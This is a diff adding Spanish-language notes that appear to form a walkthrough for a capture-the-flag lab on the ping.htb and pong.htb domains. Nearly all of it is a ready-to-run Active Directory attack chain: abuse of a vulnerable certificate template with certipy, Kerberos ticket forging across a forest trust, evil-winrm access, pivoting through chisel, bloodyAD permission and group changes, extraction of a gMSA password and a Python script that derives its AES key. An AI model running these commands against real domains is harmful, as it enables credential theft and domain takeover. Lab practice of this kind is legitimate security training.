@@ -1,0 +1,54 @@
+* utiliza nxc -u user -p pass --
+* solicita un TGT para croberts y exportalo
+* busca plantillas vulnerables
+  certipy-ad find -u 'c.roberts@ping.htb' -k -no-pass -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -vulnerable -enabled
+* solicita el pfx con la plantilla vulnerable
+  certipy-ad req -u 'c.roberts@ping.htb' -k -no-pass -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -ca ping-DC1-CA -template TemporaryWinRM -debug
+* autentifica con el pfx para consegir un segundo tgt 
+  certipy-ad auth -pfx c.roberts.pfx -dc-ip 10.129.245.56 -debug
+* utiliza el nuevo ccache para acceder por evil-winrm
+  evil-winrm -i dc1.ping.htb -r PING.HTB -K c.roberts.ccache
+* usa proxychains + chisel para que puedas llegar al dc2 (192.168.2.2)
+* con el tunel ejecutado, hay que solicitar tickets para el otro bosque (ya que tienen una relacion de confianza)
+  1- Primero solicitemos un ticket referencial a ping
+
+    impacket-getST -k -no-pass -spn 'krbtgt/PONG.HTB@PING.HTB' -dc-ip <IP_DC1> 'PING.HTB/c.roberts'
+
+  2- Con el ticket referencial para solicitar un ticket pero ahora para el segundo bosque/dominio
+
+    export KRB5CCNAME=/ruta/a/referral_ticket.ccache
+    impacket-getST -k -no-pass -spn 'ldap/dc2.pong.htb' -dc-ip <IP_DC2> 'PONG.HTB/c.roberts'
+* una vez con el ST (Service ticket) podemos usar bloodyad en el segundo dominio PONG
+* añade al usuario controlado c.roberts y dale permisos generic all al grupo gMSA Managers
+  proxychains bloodyad --host dc2.pong.htb -d pong.htb -u c.roberts -k add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617 (sid de c.roberts obtenido con bloodyad o con winrm del dc1.ping.htb)'
+
+* convertimos el grupo gmsa Managers de objeto global (solo para para dc2.pong) a un grupo universal para todos los bosques y loego a un objeto de Dominio local
+  # 1. Cambiar de Global a Universal
+   bloodyAD --host dc2.pong.htb -d pong.htb -k --dc-ip 192.168.2.2 set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483640
+
+  # 2. Cambiar de Universal a Domain Local
+  bloodyAD --host dc2.pong.htb -d pong.htb -k --dc-ip 192.168.2.2 set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644
+
+  #3. Añadimos a c.roberts como miembro del grupo que ahora es de dominio local
+  bloodyAD --host dc2.pong.htb -d pong.htb -k --dc-ip 192.168.2.2 add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617' 
+
+* una vez que los cambios ya se an logrado, hay que resolicitar el ticket de c.roberts con el metodo de certipy (si te da error usa getST como arriba para poder leer)
+  certipy req -k -no-pass -ca ping-DC1-CA -template TemporaryWinRM -target dc1.ping.htb -dc-ip 10.129.43.213 -dc-host dc1.ping.htb
+  certipy auth -pfx c.roberts.pfx -dc-ip 10.129.43.213
+  export KRB5CCNAME=$(pwd)/c.roberts.ccache
+
+* ahora que ya tenemeos la lecutar de pong_gmsa$ podemos extraer su contraseña
+    proxychains nxc ldap dc2.pong.htb -k --use-kcache --gmsa
+
+* crea el siguiente scrpit de python para derivar la llave aes (asekey)
+from impacket.krb5.crypto import _AES256CTS
+import base64
+
+# blob is the B64ENCODED value from bloodyAD output
+blob = base64.b64decode('b64 blob')
+pwd = blob.decode('utf-16-le', errors='replace').encode('utf-8')
+salt = b'PONG.HTBhostpong_gmsa.pong.htb'
+aes256 = _AES256CTS.string_to_key(pwd, salt, b'\x00\x00\x10\x00').contents.hex()
+print(aes256)
+
+
